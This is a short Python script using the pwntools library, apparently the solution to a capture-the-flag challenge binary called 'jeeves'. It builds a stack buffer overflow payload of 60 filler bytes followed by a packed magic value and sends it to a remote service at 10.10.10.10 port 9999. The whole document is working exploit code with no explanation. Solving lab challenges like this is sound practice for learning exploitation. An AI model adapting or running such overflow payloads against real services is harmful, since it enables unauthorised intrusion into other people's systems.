import pwn

payload = b'A' * 60 + pwn.p64(0x1337bab3)

#io = pwn.process("./jeeves")
io = pwn.remote('10.10.10.10', 9999)
io.sendline(payload)


#io.interactive()
